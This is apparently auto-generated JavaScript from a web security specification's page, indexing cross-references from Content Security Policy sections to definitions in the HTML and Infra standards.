        window.dfnpanelData['158b3a38'] = { "dfnID": "158b3a38", "url": "https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list", "dfnText": "csp list", "refSections": [{ "refs": [{ "id": "ref-for-policy-container-csp-list" }, { "id": "ref-for-policy-container-csp-list\u2460" }], "title": "4.1.1. \n    Report Content Security Policy violations for request\n  " }, { "refs": [{ "id": "ref-for-policy-container-csp-list\u2461" }, { "id": "ref-for-policy-container-csp-list\u2462" }], "title": "4.1.2. \n    Should request be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-policy-container-csp-list\u2463" }, { "id": "ref-for-policy-container-csp-list\u2464" }], "title": "4.1.3. \n    Should response to request be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-policy-container-csp-list\u2465" }], "title": "4.2. \n    Integration with HTML\n  " }, { "refs": [{ "id": "ref-for-policy-container-csp-list\u2466" }], "title": "4.2.1. \n    Run CSP initialization for a Document\n  " }, { "refs": [{ "id": "ref-for-policy-container-csp-list\u2467" }, { "id": "ref-for-policy-container-csp-list\u2468" }], "title": "4.2.2. \n    Retrieve the CSP list of an object\n  " }, { "refs": [{ "id": "ref-for-policy-container-csp-list\u2460\u24ea" }], "title": "4.2.4. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-policy-container-csp-list\u2460\u2460" }], "title": "4.2.5. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  " }], "external": true };
        window.dfnpanelData['27e00acc'] = { "dfnID": "27e00acc", "url": "https://html.spec.whatwg.org/multipage/browsers.html#csp-derived-sandboxing-flags", "dfnText": "csp-derived sandboxing flags", "refSections": [{ "refs": [{ "id": "ref-for-csp-derived-sandboxing-flags" }], "title": "4.2. \n    Integration with HTML\n  " }, { "refs": [{ "id": "ref-for-csp-derived-sandboxing-flags\u2460" }], "title": "6.3.2.1. \n    sandbox Initialization\n  " }], "external": true };
        window.dfnpanelData['12b8dfc0'] = { "dfnID": "12b8dfc0", "url": "https://html.spec.whatwg.org/multipage/webappapis.html#current-settings-object", "dfnText": "current settings object", "refSections": [{ "refs": [{ "id": "ref-for-current-settings-object" }], "title": "4.2.3. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  " }], "external": true };
        window.dfnpanelData['4468342f'] = { "dfnID": "4468342f", "url": "https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-object-data", "dfnText": "data", "refSections": [{ "refs": [{ "id": "ref-for-attr-object-data" }], "title": "6.1.9. object-src" }], "external": true };
        window.dfnpanelData['04e0443f'] = { "dfnID": "04e0443f", "url": "https://html.spec.whatwg.org/multipage/nav-history-apis.html#dom-document-2", "dfnText": "document", "refSections": [{ "refs": [{ "id": "ref-for-dom-document-2" }], "title": "2.4.1. \n    Create a violation object for global, policy, and directive\n  " }], "external": true };
        window.dfnpanelData['e0e0bca6'] = { "dfnID": "e0e0bca6", "url": "https://html.spec.whatwg.org/multipage/parsing.html#parse-error-duplicate-attribute", "dfnText": "duplicate-attribute", "refSections": [{ "refs": [{ "id": "ref-for-parse-error-duplicate-attribute" }], "title": "6.7.3.1. \n    Is element nonceable?\n  " }], "external": true };
        window.dfnpanelData['49a6cb20'] = { "dfnID": "49a6cb20", "url": "https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element", "dfnText": "embed", "refSections": [{ "refs": [{ "id": "ref-for-the-embed-element" }, { "id": "ref-for-the-embed-element\u2460" }], "title": "6.1.9. object-src" }, { "refs": [{ "id": "ref-for-the-embed-element\u2461" }], "title": "6.4.2. frame-ancestors" }], "external": true };
        window.dfnpanelData['3e12e042'] = { "dfnID": "3e12e042", "url": "https://html.spec.whatwg.org/multipage/webappapis.html#environment-settings-object", "dfnText": "environment settings object", "refSections": [{ "refs": [{ "id": "ref-for-environment-settings-object" }], "title": "2.2. Policies" }, { "refs": [{ "id": "ref-for-environment-settings-object\u2460" }], "title": "4.2.2. \n    Retrieve the CSP list of an object\n  " }], "external": true };
        window.dfnpanelData['88ed8860'] = { "dfnID": "88ed8860", "url": "https://html.spec.whatwg.org/multipage/obsolete.html#frame", "dfnText": "frame", "refSections": [{ "refs": [{ "id": "ref-for-frame" }], "title": "6.1.1. child-src" }, { "refs": [{ "id": "ref-for-frame\u2460" }], "title": "6.4.2. frame-ancestors" }], "external": true };
        window.dfnpanelData['4b6086d7'] = { "dfnID": "4b6086d7", "url": "https://html.spec.whatwg.org/multipage/webappapis.html#global-object", "dfnText": "global object", "refSections": [{ "refs": [{ "id": "ref-for-global-object" }], "title": "2.3. Directives" }, { "refs": [{ "id": "ref-for-global-object\u2460" }, { "id": "ref-for-global-object\u2461" }], "title": "2.4. Violations" }, { "refs": [{ "id": "ref-for-global-object\u2462" }], "title": "2.4.1. \n    Create a violation object for global, policy, and directive\n  " }, { "refs": [{ "id": "ref-for-global-object\u2463" }, { "id": "ref-for-global-object\u2464" }, { "id": "ref-for-global-object\u2465" }, { "id": "ref-for-global-object\u2466" }], "title": "4.2. \n    Integration with HTML\n  " }, { "refs": [{ "id": "ref-for-global-object\u2467" }], "title": "4.2.3. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-global-object\u2468" }], "title": "4.2.6. \n    Run CSP initialization for a global object\n  " }, { "refs": [{ "id": "ref-for-global-object\u2460\u24ea" }], "title": "4.3.1. \n    Should RTC connections be blocked for global?\n  " }, { "refs": [{ "id": "ref-for-global-object\u2460\u2460" }, { "id": "ref-for-global-object\u2460\u2461" }], "title": "6.3.1.1. \n    Is base allowed for document?\n  " }, { "refs": [{ "id": "ref-for-global-object\u2460\u2462" }], "title": "6.3.2.1. \n    sandbox Initialization\n  " }], "external": true };
        window.dfnpanelData['8a30477b'] = { "dfnID": "8a30477b", "url": "https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global", "dfnText": "global object (for environment settings object)", "refSections": [{ "refs": [{ "id": "ref-for-concept-settings-object-global" }], "title": "2.4.2. \n    Create a violation object for request, and policy.\n  " }, { "refs": [{ "id": "ref-for-concept-settings-object-global\u2460" }], "title": "4.2.3. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-concept-settings-object-global\u2461" }, { "id": "ref-for-concept-settings-object-global\u2462" }, { "id": "ref-for-concept-settings-object-global\u2463" }], "title": "4.2.4. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-concept-settings-object-global\u2464" }], "title": "4.2.5. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  " }], "external": true };
        window.dfnpanelData['168f1b6e'] = { "dfnID": "168f1b6e", "url": "https://html.spec.whatwg.org/multipage/webappapis.html#concept-realm-global", "dfnText": "global object (for realm)", "refSections": [{ "refs": [{ "id": "ref-for-concept-realm-global" }], "title": "4.4.1. \n    EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString, codeString, compilationType, parameterArgs, bodyArg)\n  " }, { "refs": [{ "id": "ref-for-concept-realm-global\u2460" }], "title": "4.5.1. \n  EnsureCSPDoesNotBlockWasmByteCompilationrealm\n" }], "external": true };
        window.dfnpanelData['56c6bafc'] = { "dfnID": "56c6bafc", "url": "https://html.spec.whatwg.org/multipage/semantics.html#attr-base-href", "dfnText": "href", "refSections": [{ "refs": [{ "id": "ref-for-attr-base-href" }], "title": "4.2. \n    Integration with HTML\n  " }, { "refs": [{ "id": "ref-for-attr-base-href\u2460" }], "title": "6.3.1.1. \n    Is base allowed for document?\n  " }], "external": true };
        window.dfnpanelData['448c95f9'] = { "dfnID": "448c95f9", "url": "https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-http-equiv", "dfnText": "http-equiv", "refSections": [{ "refs": [{ "id": "ref-for-attr-meta-http-equiv" }], "title": "3. \n    Policy Delivery\n  " }, { "refs": [{ "id": "ref-for-attr-meta-http-equiv\u2460" }], "title": "3.3. \n    The <meta> element\n  " }, { "refs": [{ "id": "ref-for-attr-meta-http-equiv\u2461" }], "title": "4.2. \n    Integration with HTML\n  " }], "external": true };
        window.dfnpanelData['87fcd40c'] = { "dfnID": "87fcd40c", "url": "https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element", "dfnText": "iframe", "refSections": [{ "refs": [{ "id": "ref-for-the-iframe-element" }], "title": "6.1.1. child-src" }, { "refs": [{ "id": "ref-for-the-iframe-element\u2460" }, { "id": "ref-for-the-iframe-element\u2461" }], "title": "6.3.2. sandbox" }, { "refs": [{ "id": "ref-for-the-iframe-element\u2462" }], "title": "6.4.2. frame-ancestors" }], "external": true };
        window.dfnpanelData['6cfa013d'] = { "dfnID": "6cfa013d", "url": "https://html.spec.whatwg.org/multipage/semantics.html#the-link-element", "dfnText": "link", "refSections": [{ "refs": [{ "id": "ref-for-the-link-element" }], "title": "3.3. \n    The <meta> element\n  " }, { "refs": [{ "id": "ref-for-the-link-element\u2460" }], "title": "6.1.13. style-src" }], "external": true };
        window.dfnpanelData['64b89595'] = { "dfnID": "64b89595", "url": "https://html.spec.whatwg.org/multipage/semantics.html#meta", "dfnText": "meta", "refSections": [{ "refs": [{ "id": "ref-for-meta" }], "title": "3. \n    Policy Delivery\n  " }, { "refs": [{ "id": "ref-for-meta\u2460" }], "title": "3.2. \n    The Content-Security-Policy-Report-Only HTTP Response Header Field\n  " }, { "refs": [{ "id": "ref-for-meta\u2461" }, { "id": "ref-for-meta\u2462" }, { "id": "ref-for-meta\u2463" }, { "id": "ref-for-meta\u2464" }, { "id": "ref-for-meta\u2465" }, { "id": "ref-for-meta\u2466" }, { "id": "ref-for-meta\u2467" }], "title": "3.3. \n    The <meta> element\n  " }, { "refs": [{ "id": "ref-for-meta\u2468" }], "title": "4.2. \n    Integration with HTML\n  " }, { "refs": [{ "id": "ref-for-meta\u2460\u24ea" }], "title": "6.3.2. sandbox" }, { "refs": [{ "id": "ref-for-meta\u2460\u2460" }], "title": "6.4.2. frame-ancestors" }], "external": true };
        window.dfnpanelData['5ab373ec'] = { "dfnID": "5ab373ec", "url": "https://html.spec.whatwg.org/#navigable", "dfnText": "navigable", "refSections": [{ "refs": [{ "id": "ref-for-navigable" }], "title": "2.3. Directives" }, { "refs": [{ "id": "ref-for-navigable\u2460" }], "title": "4.2.5. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-navigable\u2461" }], "title": "6.1.9. object-src" }, { "refs": [{ "id": "ref-for-navigable\u2462" }, { "id": "ref-for-navigable\u2463" }], "title": "6.4.2.1. \n    frame-ancestors Navigation Response Check\n  " }], "external": true };
        window.dfnpanelData['13dd6cae'] = { "dfnID": "13dd6cae", "url": "https://html.spec.whatwg.org/multipage/document-sequences.html#node-navigable", "dfnText": "node navigable", "refSections": [{ "refs": [{ "id": "ref-for-node-navigable" }], "title": "6.4.2.1. \n    frame-ancestors Navigation Response Check\n  " }], "external": true };
        window.dfnpanelData['b1e9fc19'] = { "dfnID": "b1e9fc19", "url": "https://html.spec.whatwg.org/multipage/urls-and-fetching.html#attr-nonce", "dfnText": "nonce", "refSections": [{ "refs": [{ "id": "ref-for-attr-nonce" }], "title": "6.7.3.3. \n    Does element match source list for type and source?\n  " }, { "refs": [{ "id": "ref-for-attr-nonce\u2460" }], "title": "7.2.2. Nonce exfiltration via content attributes" }, { "refs": [{ "id": "ref-for-attr-nonce\u2461" }], "title": "8.2. \n    Usage of \"'strict-dynamic'\"\n  " }], "external": true };
        window.dfnpanelData['99b5cef6'] = { "dfnID": "99b5cef6", "url": "https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element", "dfnText": "object", "refSections": [{ "refs": [{ "id": "ref-for-the-object-element" }, { "id": "ref-for-the-object-element\u2460" }, { "id": "ref-for-the-object-element\u2461" }, { "id": "ref-for-the-object-element\u2462" }], "title": "6.1.9. object-src" }, { "refs": [{ "id": "ref-for-the-object-element\u2463" }], "title": "6.4.2. frame-ancestors" }], "external": true };
        window.dfnpanelData['b01b1359'] = { "dfnID": "b01b1359", "url": "https://html.spec.whatwg.org/multipage/browsers.html#concept-origin-opaque", "dfnText": "opaque origin", "refSections": [{ "refs": [{ "id": "ref-for-concept-origin-opaque" }], "title": "2.2. Policies" }], "external": true };
        window.dfnpanelData['b4f2d668'] = { "dfnID": "b4f2d668", "url": "https://html.spec.whatwg.org/#concept-origin", "dfnText": "origin", "refSections": [{ "refs": [{ "id": "ref-for-concept-origin" }], "title": "2.2. Policies" }, { "refs": [{ "id": "ref-for-concept-origin\u2460" }], "title": "6.7.2.7. \n    Does url match source list in origin with redirect count?\n  " }, { "refs": [{ "id": "ref-for-concept-origin\u2461" }, { "id": "ref-for-concept-origin\u2462" }], "title": "6.7.2.8. \n    Does url match expression in origin with redirect count?\n  " }], "external": true };
        window.dfnpanelData['43ac8374'] = { "dfnID": "43ac8374", "url": "https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-origin", "dfnText": "origin (for environment settings object)", "refSections": [{ "refs": [{ "id": "ref-for-concept-settings-object-origin" }], "title": "2.2. Policies" }, { "refs": [{ "id": "ref-for-concept-settings-object-origin\u2460" }], "title": "5.5. \n    Report a violation\n  " }], "external": true };
        window.dfnpanelData['53f0ea4e'] = { "dfnID": "53f0ea4e", "url": "https://html.spec.whatwg.org/multipage/browsers.html#parse-a-sandboxing-directive", "dfnText": "parse a sandboxing directive", "refSections": [{ "refs": [{ "id": "ref-for-parse-a-sandboxing-directive" }], "title": "6.3.2.1. \n    sandbox Initialization\n  " }], "external": true };
        window.dfnpanelData['9f53ade1'] = { "dfnID": "9f53ade1", "url": "https://html.spec.whatwg.org/multipage/images.html#concept-microsyntax-parse-error", "dfnText": "parse error", "refSections": [{ "refs": [{ "id": "ref-for-concept-microsyntax-parse-error" }], "title": "6.7.3.1. \n    Is element nonceable?\n  " }], "external": true };
        window.dfnpanelData['3da24a47'] = { "dfnID": "3da24a47", "url": "https://html.spec.whatwg.org/multipage/links.html#ping", "dfnText": "ping", "refSections": [{ "refs": [{ "id": "ref-for-ping" }], "title": "6.1.2. connect-src" }], "external": true };
        window.dfnpanelData['48958f5d'] = { "dfnID": "48958f5d", "url": "https://html.spec.whatwg.org/#plugin", "dfnText": "plugin", "refSections": [{ "refs": [{ "id": "ref-for-plugin" }], "title": "6.1.9. object-src" }], "external": true };
        window.dfnpanelData['b33787b2'] = { "dfnID": "b33787b2", "url": "https://html.spec.whatwg.org/multipage/browsers.html#policy-container", "dfnText": "policy container", "refSections": [{ "refs": [{ "id": "ref-for-policy-container" }, { "id": "ref-for-policy-container\u2460" }], "title": "4.2. \n    Integration with HTML\n  " }], "external": true };
        window.dfnpanelData['08639fbc'] = { "dfnID": "08639fbc", "url": "https://html.spec.whatwg.org/multipage/dom.html#concept-document-policy-container", "dfnText": "policy container (for Document)", "refSections": [{ "refs": [{ "id": "ref-for-concept-document-policy-container" }], "title": "4.2.1. \n    Run CSP initialization for a Document\n  " }, { "refs": [{ "id": "ref-for-concept-document-policy-container\u2460" }], "title": "4.2.2. \n    Retrieve the CSP list of an object\n  " }], "external": true };
        window.dfnpanelData['bd1db03d'] = { "dfnID": "bd1db03d", "url": "https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-policy-container", "dfnText": "policy container (for environment settings object)", "refSections": [{ "refs": [{ "id": "ref-for-concept-settings-object-policy-container" }], "title": "4.2.2. \n    Retrieve the CSP list of an object\n  " }], "external": true };
        window.dfnpanelData['cc0cac2e'] = { "dfnID": "cc0cac2e", "url": "https://html.spec.whatwg.org/#link-type-preconnect", "dfnText": "preconnect", "refSections": [{ "refs": [{ "id": "ref-for-link-type-preconnect" }], "title": "6.1.3. default-src" }], "external": true };
        window.dfnpanelData['92896584'] = { "dfnID": "92896584", "url": "https://html.spec.whatwg.org/#link-type-prefetch", "dfnText": "prefetch", "refSections": [{ "refs": [{ "id": "ref-for-link-type-prefetch" }], "title": "6.1.3. default-src" }, { "refs": [{ "id": "ref-for-link-type-prefetch\u2460" }, { "id": "ref-for-link-type-prefetch\u2461" }], "title": "8.6. \n      Exfiltration\n    " }], "external": true };
        window.dfnpanelData['215d47ca'] = { "dfnID": "215d47ca", "url": "https://html.spec.whatwg.org/#prepare-the-script-element", "dfnText": "prepare the script element", "refSections": [{ "refs": [{ "id": "ref-for-prepare-the-script-element" }], "title": "4.2. \n    Integration with HTML\n  " }], "external": true };
        window.dfnpanelData['9a517a7d'] = { "dfnID": "9a517a7d", "url": "https://html.spec.whatwg.org/multipage/webappapis.html#queue-a-task", "dfnText": "queue a task", "refSections": [{ "refs": [{ "id": "ref-for-queue-a-task" }], "title": "5.5. \n    Report a violation\n  " }], "external": true };
        window.dfnpanelData['0aa2f0c0'] = { "dfnID": "0aa2f0c0", "url": "https://html.spec.whatwg.org/multipage/dom.html#dom-document-referrer", "dfnText": "referrer", "refSections": [{ "refs": [{ "id": "ref-for-dom-document-referrer" }], "title": "2.4.1. \n    Create a violation object for global, policy, and directive\n  " }], "external": true };
        window.dfnpanelData['9c4c1e66'] = { "dfnID": "9c4c1e66", "url": "https://html.spec.whatwg.org/multipage/webappapis.html#relevant-settings-object", "dfnText": "relevant settings object", "refSections": [{ "refs": [{ "id": "ref-for-relevant-settings-object" }, { "id": "ref-for-relevant-settings-object\u2460" }, { "id": "ref-for-relevant-settings-object\u2461" }], "title": "5.5. \n    Report a violation\n  " }], "external": true };
        window.dfnpanelData['ea6f3f13'] = { "dfnID": "ea6f3f13", "url": "https://html.spec.whatwg.org/multipage/workers.html#run-a-worker", "dfnText": "run a worker", "refSections": [{ "refs": [{ "id": "ref-for-run-a-worker" }], "title": "4.2. \n    Integration with HTML\n  " }, { "refs": [{ "id": "ref-for-run-a-worker\u2460" }], "title": "6.1.1. child-src" }], "external": true };
        window.dfnpanelData['5c35dd47'] = { "dfnID": "5c35dd47", "url": "https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox", "dfnText": "sandbox", "refSections": [{ "refs": [{ "id": "ref-for-attr-iframe-sandbox" }, { "id": "ref-for-attr-iframe-sandbox\u2460" }], "title": "6.3.2. sandbox" }], "external": true };
        window.dfnpanelData['da63e480'] = { "dfnID": "da63e480", "url": "https://html.spec.whatwg.org/multipage/browsers.html#sandboxed-origin-browsing-context-flag", "dfnText": "sandboxed origin browsing context flag", "refSections": [{ "refs": [{ "id": "ref-for-sandboxed-origin-browsing-context-flag" }], "title": "6.3.2.1. \n    sandbox Initialization\n  " }], "external": true };
        window.dfnpanelData['c1d81171'] = { "dfnID": "c1d81171", "url": "https://html.spec.whatwg.org/multipage/browsers.html#sandboxed-scripts-browsing-context-flag", "dfnText": "sandboxed scripts browsing context flag", "refSections": [{ "refs": [{ "id": "ref-for-sandboxed-scripts-browsing-context-flag" }], "title": "6.3.2.1. \n    sandbox Initialization\n  " }], "external": true };
        window.dfnpanelData['457a6f4c'] = { "dfnID": "457a6f4c", "url": "https://html.spec.whatwg.org/multipage/browsers.html#sandboxing-flag-set", "dfnText": "sandboxing flag set", "refSections": [{ "refs": [{ "id": "ref-for-sandboxing-flag-set" }], "title": "6.3.2.1. \n    sandbox Initialization\n  " }], "external": true };
        window.dfnpanelData['a23d12a9'] = { "dfnID": "a23d12a9", "url": "https://html.spec.whatwg.org/multipage/browsers.html#concept-origin-scheme", "dfnText": "scheme", "refSections": [{ "refs": [{ "id": "ref-for-concept-origin-scheme" }, { "id": "ref-for-concept-origin-scheme\u2460" }], "title": "6.7.2.8. \n    Does url match expression in origin with redirect count?\n  " }], "external": true };
        window.dfnpanelData['0cf3964f'] = { "dfnID": "0cf3964f", "url": "https://html.spec.whatwg.org/multipage/scripting.html#script", "dfnText": "script", "refSections": [{ "refs": [{ "id": "ref-for-script" }, { "id": "ref-for-script\u2460" }], "title": "1.3. Changes from Level 2" }, { "refs": [{ "id": "ref-for-script\u2461" }], "title": "3.3. \n    The <meta> element\n  " }, { "refs": [{ "id": "ref-for-script\u2462" }, { "id": "ref-for-script\u2463" }, { "id": "ref-for-script\u2464" }], "title": "6.1.10. script-src" }, { "refs": [{ "id": "ref-for-script\u2465" }, { "id": "ref-for-script\u2466" }], "title": "6.7.3.1. \n    Is element nonceable?\n  " }, { "refs": [{ "id": "ref-for-script\u2467" }, { "id": "ref-for-script\u2468" }], "title": "6.7.3.3. \n    Does element match source list for type and source?\n  " }, { "refs": [{ "id": "ref-for-script\u2460\u24ea" }, { "id": "ref-for-script\u2460\u2460" }, { "id": "ref-for-script\u2460\u2461" }], "title": "7.2.1. Dangling markup attacks" }, { "refs": [{ "id": "ref-for-script\u2460\u2462" }, { "id": "ref-for-script\u2460\u2463" }, { "id": "ref-for-script\u2460\u2464" }], "title": "8.2. \n    Usage of \"'strict-dynamic'\"\n  " }, { "refs": [{ "id": "ref-for-script\u2460\u2465" }, { "id": "ref-for-script\u2460\u2466" }, { "id": "ref-for-script\u2460\u2467" }, { "id": "ref-for-script\u2460\u2468" }, { "id": "ref-for-script\u2461\u24ea" }], "title": "8.4. \n      Allowing external JavaScript via hashes\n    " }], "external": true };
        window.dfnpanelData['09f349d5'] = { "dfnID": "09f349d5", "url": "https://html.spec.whatwg.org/multipage/semantics.html#set-the-frozen-base-url", "dfnText": "set the frozen base url", "refSections": [{ "refs": [{ "id": "ref-for-set-the-frozen-base-url" }], "title": "4.2. \n    Integration with HTML\n  " }, { "refs": [{ "id": "ref-for-set-the-frozen-base-url\u2460" }], "title": "6.3.1. base-uri" }], "external": true };
        window.dfnpanelData['122f01fb'] = { "dfnID": "122f01fb", "url": "https://html.spec.whatwg.org/multipage/timers-and-user-prompts.html#dom-setinterval", "dfnText": "setInterval(handler, timeout, ...arguments)", "refSections": [{ "refs": [{ "id": "ref-for-dom-setinterval" }], "title": "6.1.10. script-src" }], "external": true };
        window.dfnpanelData['3332e595'] = { "dfnID": "3332e595", "url": "https://html.spec.whatwg.org/multipage/timers-and-user-prompts.html#dom-settimeout", "dfnText": "setTimeout(handler, timeout, ...arguments)", "refSections": [{ "refs": [{ "id": "ref-for-dom-settimeout" }], "title": "6.1.10. script-src" }], "external": true };
        window.dfnpanelData['ba920583'] = { "dfnID": "ba920583", "url": "https://html.spec.whatwg.org/multipage/semantics.html#the-style-element", "dfnText": "style", "refSections": [{ "refs": [{ "id": "ref-for-the-style-element" }], "title": "6.1.13. style-src" }, { "refs": [{ "id": "ref-for-the-style-element\u2460" }, { "id": "ref-for-the-style-element\u2461" }], "title": "6.7.3.3. \n    Does element match source list for type and source?\n  " }, { "refs": [{ "id": "ref-for-the-style-element\u2462" }], "title": "7.2.1. Dangling markup attacks" }], "external": true };
        window.dfnpanelData['3144baec'] = { "dfnID": "3144baec", "url": "https://html.spec.whatwg.org/multipage/semantics.html#update-a-style-block", "dfnText": "update a style block", "refSections": [{ "refs": [{ "id": "ref-for-update-a-style-block" }], "title": "4.2. \n    Integration with HTML\n  " }], "external": true };
        window.dfnpanelData['29964c8b'] = { "dfnID": "29964c8b", "url": "https://html.spec.whatwg.org/multipage/document-lifecycle.html#x-frame-options", "dfnText": "x-frame-options", "refSections": [{ "refs": [{ "id": "ref-for-x-frame-options" }, { "id": "ref-for-x-frame-options\u2460" }, { "id": "ref-for-x-frame-options\u2461" }, { "id": "ref-for-x-frame-options\u2462" }], "title": "6.4.2.2. \n    Relation to ``X-Frame-Options``\n  " }], "external": true };
        window.dfnpanelData['a3b18719'] = { "dfnID": "a3b18719", "url": "https://infra.spec.whatwg.org/#set-append", "dfnText": "append", "refSections": [{ "refs": [{ "id": "ref-for-set-append" }], "title": "2.2.1. \n    Parse a serialized CSP\n  " }], "external": true };
        window.dfnpanelData['7f9469b5'] = { "dfnID": "7f9469b5", "url": "https://infra.spec.whatwg.org/#ascii-case-insensitive", "dfnText": "ascii case-insensitive", "refSections": [{ "refs": [{ "id": "ref-for-ascii-case-insensitive" }], "title": "3.3. \n    The <meta> element\n  " }, { "refs": [{ "id": "ref-for-ascii-case-insensitive\u2460" }], "title": "4.4.1. \n    EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString, codeString, compilationType, parameterArgs, bodyArg)\n  " }, { "refs": [{ "id": "ref-for-ascii-case-insensitive\u2461" }, { "id": "ref-for-ascii-case-insensitive\u2462" }], "title": "4.5.1. \n  EnsureCSPDoesNotBlockWasmByteCompilationrealm\n" }, { "refs": [{ "id": "ref-for-ascii-case-insensitive\u2463" }], "title": "6.2.1.1. \n    webrtc Pre-connect Check\n  " }, { "refs": [{ "id": "ref-for-ascii-case-insensitive\u2464" }], "title": "6.7.1.1. \n    Script directives pre-request check\n  " }, { "refs": [{ "id": "ref-for-ascii-case-insensitive\u2465" }], "title": "6.7.2.4. \n    Does integrity metadata match source list?\n  " }, { "refs": [{ "id": "ref-for-ascii-case-insensitive\u2466" }], "title": "6.7.2.7. \n    Does url match source list in origin with redirect count?\n  " }, { "refs": [{ "id": "ref-for-ascii-case-insensitive\u2467" }], "title": "6.7.2.8. \n    Does url match expression in origin with redirect count?\n  " }, { "refs": [{ "id": "ref-for-ascii-case-insensitive\u2468" }, { "id": "ref-for-ascii-case-insensitive\u2460\u24ea" }, { "id": "ref-for-ascii-case-insensitive\u2460\u2460" }, { "id": "ref-for-ascii-case-insensitive\u2460\u2461" }, { "id": "ref-for-ascii-case-insensitive\u2460\u2462" }, { "id": "ref-for-ascii-case-insensitive\u2460\u2463" }, { "id": "ref-for-ascii-case-insensitive\u2460\u2464" }], "title": "6.7.2.9. \n    scheme-part matching\n  " }, { "refs": [{ "id": "ref-for-ascii-case-insensitive\u2460\u2465" }], "title": "6.7.2.10. \n    host-part matching\n  " }, { "refs": [{ "id": "ref-for-ascii-case-insensitive\u2460\u2466" }, { "id": "ref-for-ascii-case-insensitive\u2460\u2467" }], "title": "6.7.3.1. \n    Is element nonceable?\n  " }, { "refs": [{ "id": "ref-for-ascii-case-insensitive\u2460\u2468" }], "title": "6.7.3.2. \n    Does a source list allow all inline behavior for type?\n  " }, { "refs": [{ "id": "ref-for-ascii-case-insensitive\u2461\u24ea" }, { "id": "ref-for-ascii-case-insensitive\u2461\u2460" }, { "id": "ref-for-ascii-case-insensitive\u2461\u2461" }, { "id": "ref-for-ascii-case-insensitive\u2461\u2462" }], "title": "6.7.3.3. \n    Does element match source list for type and source?\n  " }], "external": true };
        window.dfnpanelData['3b38c2fe'] = { "dfnID": "3b38c2fe", "url": "https://infra.spec.whatwg.org/#ascii-digit", "dfnText": "ascii digit", "refSections": [{ "refs": [{ "id": "ref-for-ascii-digit" }], "title": "6.7.2.11. \n    port-part matching\n  " }], "external": true };
        window.dfnpanelData['6f2dfa22'] = { "dfnID": "6f2dfa22", "url": "https://infra.spec.whatwg.org/#ascii-lowercase", "dfnText": "ascii lowercase", "refSections": [{ "refs": [{ "id": "ref-for-ascii-lowercase" }], "title": "2.2.1. \n    Parse a serialized CSP\n  " }, { "refs": [{ "id": "ref-for-ascii-lowercase\u2460" }, { "id": "ref-for-ascii-lowercase\u2461" }], "title": "6.7.2.10. \n    host-part matching\n  " }], "external": true };
        window.dfnpanelData['2d5a2765'] = { "dfnID": "2d5a2765", "url": "https://infra.spec.whatwg.org/#ascii-string", "dfnText": "ascii string", "refSections": [{ "refs": [{ "id": "ref-for-ascii-string" }, { "id": "ref-for-ascii-string\u2460" }], "title": "2.2. Policies" }, { "refs": [{ "id": "ref-for-ascii-string\u2461" }], "title": "2.2.1. \n    Parse a serialized CSP\n  " }, { "refs": [{ "id": "ref-for-ascii-string\u2462" }], "title": "2.3. Directives" }, { "refs": [{ "id": "ref-for-ascii-string\u2463" }], "title": "2.3.1. Source Lists" }, { "refs": [{ "id": "ref-for-ascii-string\u2464" }, { "id": "ref-for-ascii-string\u2465" }, { "id": "ref-for-ascii-string\u2466" }], "title": "6.7.2.9. \n    scheme-part matching\n  " }, { "refs": [{ "id": "ref-for-ascii-string\u2467" }, { "id": "ref-for-ascii-string\u2468" }], "title": "6.7.2.10. \n    host-part matching\n  " }, { "refs": [{ "id": "ref-for-ascii-string\u2460\u24ea" }], "title": "6.7.2.11. \n    port-part matching\n  " }, { "refs": [{ "id": "ref-for-ascii-string\u2460\u2460" }, { "id": "ref-for-ascii-string\u2460\u2461" }], "title": "6.7.2.12. \n    path-part matching\n  " }], "external": true };
        window.dfnpanelData['5fb1ed8a'] = { "dfnID": "5fb1ed8a", "url": "https://infra.spec.whatwg.org/#ascii-whitespace", "dfnText": "ascii whitespace", "refSections": [{ "refs": [{ "id": "ref-for-ascii-whitespace" }], "title": "2.1. Infrastructure" }, { "refs": [{ "id": "ref-for-ascii-whitespace\u2460" }], "title": "2.2.1. \n    Parse a serialized CSP\n  " }], "external": true };
        window.dfnpanelData['3de9e659'] = { "dfnID": "3de9e659", "url": "https://infra.spec.whatwg.org/#byte-sequence", "dfnText": "byte sequence", "refSections": [{ "refs": [{ "id": "ref-for-byte-sequence" }, { "id": "ref-for-byte-sequence\u2460" }], "title": "2.2.1. \n    Parse a serialized CSP\n  " }], "external": true };
        window.dfnpanelData['60184fa5'] = { "dfnID": "60184fa5", "url": "https://infra.spec.whatwg.org/#collect-a-sequence-of-code-points", "dfnText": "collecting a sequence of code points", "refSections": [{ "refs": [{ "id": "ref-for-collect-a-sequence-of-code-points" }], "title": "2.2.1. \n    Parse a serialized CSP\n  " }], "external": true };
